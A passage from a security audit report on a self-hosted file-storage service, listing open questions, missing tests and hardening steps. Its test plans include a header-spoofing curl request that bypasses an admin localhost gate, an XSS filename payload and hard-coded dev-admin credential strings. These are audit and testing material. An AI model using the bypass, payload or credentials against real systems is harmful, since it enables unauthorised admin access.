| HTTP request smuggling | N/A by deployment topology | Caddy is the only public-facing HTTP processor; the upstream is `localhost:8443` Echo with HTTP/2 disabled. Smuggling risk requires a TE / CL desync between two proxies; only one proxy is in front. |
| Browser MathML / Mathematics rendering | N/A | None. |
| `Trusted-Types` adoption | **In scope, missing** — F-17 | — |
| `Cross-Origin-Opener-Policy`, `COEP`, `CORP` | In scope, missing — see §3.1, hardening §7 | — |

---

## 5. Open Questions / blocked-on-developer

1. **Runtime file modes under `/opt/arkfile/etc/**`.** Per `.clinerules` the agent cannot read those files. Verified that `scripts/prod-deploy.sh` writes `secrets.env` as `0640 arkfile:arkfile` (line 157) and `caddy-env` as `0600 caddy:caddy` (lines 551-552), and that build.sh installs systemd units as `0644 arkfile:arkfile` (lines 555-565). **Please confirm at runtime that no operator-applied chmod has loosened these modes**, and that `/opt/arkfile/etc/keys/**` (TLS certs, future on-disk keys if any) are mode `0600 arkfile:arkfile`.
2. **`bun.lock` commit status.** The file is present in the working tree (1925 bytes, text format) but its tracked-state under `.gitignore` was not verified end-to-end. **Confirm `git ls-files client/static/js/bun.lock` returns a hit.** If not, F-13 escalates.
3. **`scripts/maintenance/rotate-jwt-keys.sh` retirement.** Per F-19, the script appears to be stale. **Confirm with Slice A's owner that the on-disk path is no longer authoritative**, and decide between deletion and rewrite-against-KeyManager.
4. **Production `ENVIRONMENT=production` posture.** Per F-02 recommendation #4, the proposed hardening is to have `prod-deploy.sh`/`test-deploy.sh`/`local-deploy.sh` unconditionally write `ENVIRONMENT=production` into `secrets.env` so that `ValidateProductionConfig`'s fail-closed abort is an enforced part of every non-dev deploy rather than a heuristic. **Confirm there is no operational reason to keep `ENVIRONMENT=production` unset** in current production / `test.arkfile.net` deployments before the proposed change lands.
5. **Release-artifact signing today.** F-05 assumes there is no signing because grep finds no `cosign`/`minisign`/`gpg` references in the build scripts. **Confirm releases are unsigned**; if they are signed via an out-of-band CI process, document it so the recommendation can be narrowed to "publish detached signatures alongside binaries".
6. **`AllowedOrigins` in deployed CORS config.** `main.go:275` reads from `cfg.Server.AllowedOrigins` (Slice E scope but appears in the global middleware chain) and `AllowCredentials: true`. **Confirm `AllowedOrigins` is not `[*]` in production**; with credentials true, a wildcard origin is rejected by browsers, so the effective fail mode is "CORS misconfiguration breaks the app", but worth confirming explicitly.
7. **`/healthz` and `/readyz` privileged?** F-20 recommends moving them to a loopback listener. **Decide whether any external monitoring depends on them today** before changing.
8. **Caddy binary supply chain.** Slice F treats Caddy as a pinned external binary, but `scripts/prod-deploy.sh` was not read in detail for the Caddy download step. **Confirm `prod-deploy.sh` pins a specific Caddy release hash**; if not, file a follow-up at the same severity as F-11/F-12.

---

## 6. Testing Gaps (to feed into Slice G)

Tests that this slice's findings demand and that are missing in the present codebase. Prioritized.

1. **High-priority — `X-Forwarded-For` localhost-gate bypass (F-01)**:
   - End-to-end: off-host `curl -H "X-Forwarded-For: 127.0.0.1" .../api/admin/users` → 403.
   - End-to-end: same for `/api/bootstrap/*`.
   - Unit: synthesize an `echo.Context` with `Request().RemoteAddr = "10.0.0.5:12345"` and `XFF = "127.0.0.1"`; call `AdminMiddleware`; expect 403.
   - Should also re-run for every Slice A / Slice E finding that depends on `c.RealIP()`.

2. **Medium-priority — dev-admin build-tag separation (F-02)**:
   - Post-build: `strings ./build/bin/arkfile | grep -c -E 'DevAdmin2025|ARKFILEPKZBXCMJLGB5HM5D2GEVVU32D'` returns 0 after build-tag separation lands.
   - Integration: boot the prod-tag binary with `ADMIN_USERNAMES=arkfile-dev-admin`; the auto-create code path should not even be linked in.
   - Regression: `ValidateProductionConfig` with `ENVIRONMENT=production` + `ADMIN_USERNAMES=arkfile-dev-admin` returns the `FATAL:` startup error.

3. **High-priority — WASM integrity (F-04)**:
   - Integration: tamper with `libopaque.js` post-build; next browser load fails SRI check.
   - Server-startup self-test: compare on-disk hash against `dependency-hashes.json` entry.

4. **High-priority — build reproducibility (F-05)**:
   - CI: clean rebuild × 2 from same commit → `sha256sum` matches across all three binaries.
   - CI: `strings ./build/bin/arkfile | grep -E '/home/|/Users/'` → empty.

5. **Medium-priority — bootstrap-token hygiene (F-03)**:
   - Integration: deploy + capture journal; verify token does **not** appear after the F-03 fix lands.
   - Integration: redemption past TTL → 403.

6. **Medium-priority — XSS via filename / contact-info (F-07, F-08, F-17)**:
   - Playwright: upload a file with a filename containing `<img src=x onerror=alert(1)>` (filename is encrypted at rest but rendered after decrypt); verify Trusted Types blocks execution.
   - Playwright: contact-info field with the same payload; same expectation.
   - Static-analysis CI rule: ban `innerHTML =` outside the `sanitize` wrapper.

7. **Medium-priority — frozen lockfile + audit (F-13, F-25)**:
   - CI: `bun install --frozen-lockfile`; `git diff --exit-code bun.lock`.
   - CI: `govulncheck ./...` and `bun audit` fail on high-severity.

8. **Medium-priority — systemd hardening (F-09)**:
   - CI: `systemd-analyze security <unit>` ≤ target score.
   - Smoke: send SIGSEGV to arkfile; assert no file under `/var/lib/systemd/coredump/`.

9. **Low-priority — rqlite loopback bind (F-10)**:
   - Post-deploy: `ss -ltn 'sport = :4001 or sport = :4002'` → only `127.0.0.1` bind addresses.

10. **Low-priority — sourcemap exposure (F-22)**:
    - HTTP probe: `GET /js/dist/app.js.map` → 404 after the fix.

---

## 7. Hardening Recommendations (not vulnerabilities)

Recommendations that improve security posture without being tied to a single finding.

1. **Adopt CSP Trusted Types (`require-trusted-types-for 'script'`)** alongside the F-17 refactor. Make every `innerHTML` sink a typed value or a `textContent` write.
2. **Add `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=(), accelerometer=(), gyroscope=(), magnetometer=(), ambient-light-sensor=(), display-capture=(), midi=(), encrypted-media=(), sync-xhr=()`** to the Go CSP middleware. One-line change, defense-in-depth against XSS.
3. **Add `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Embedder-Policy: require-corp`, `Cross-Origin-Resource-Policy: same-origin`** to enable site isolation. Required if any future Shared Array Buffer / WASM threading is added.
4. **Move auth tokens to `HttpOnly` cookies** with `SameSite=Strict` and a CSRF double-submit token. Drop `localStorage` storage entirely (greenfield — no compatibility shim).
5. **Consolidate header emission.** Today HSTS is set by Caddy *and* by Go's `SecureWithConfig`, XFO is set by `SecureWithConfig` (`SAMEORIGIN`) *and* by `CSPMiddleware` (`DENY`). The Go layer wins by middleware order but the duplication invites drift. Pick one source per header.
6. **Build reproducibly.** F-05 + F-06 + F-12 + F-13 together. Run a `make verify-reproducible` step in CI.
7. **Sign release artifacts** via `cosign sign-blob` (or `minisign`) and publish a `cosign.pub` in the repo. Operators verify with `cosign verify-blob`.
8. **Emit an SBOM** at build time (`syft packages dir:.`) and publish alongside releases.
9. **Run `govulncheck` and `bun audit` in CI**; fail on high-severity findings.
10. **Move `/healthz` and `/readyz` to a loopback listener** (or to `/internal/...` gated by a fixed token). The public surface should not expose readiness errors.
11. **Pin the Caddy binary** (Open Question §5 item 8) and verify its hash on every deploy.
12. **Pin libsodium as a vendored submodule** and statically link it in `build-libopaque.sh`.
13. **Replace MD5 with SHA-256** for SeaweedFS pinning (F-11) and apply hash pinning to rqlite (F-12).
14. **Audit `scripts/maintenance/**` for stale assumptions** (F-19 is one example; there may be others).
15. **Document the Caddy-and-Arkfile-co-located trust model** explicitly in `docs/security.md` so the `tls_insecure_skip_verify` decision is auditable.
16. **Add `LimitCORE=0`** as the *first* hardening step on all four units. It is a one-line change with zero functional impact and the single largest risk reduction.
17. **Document that the bootstrap-token-in-journal behavior is a known issue** and that operators must invalidate the token by restarting the service if they cannot redeem it immediately. Schedule the F-03 fix.
18. **Add a startup self-test that probes its own admin surface** with `X-Forwarded-For: 127.0.0.1` from a non-loopback peer (a tiny test harness running on the same machine via a different netns) and refuses to start if the gate passes. This catches F-01 regressions deterministically.

---

## End of Slice F
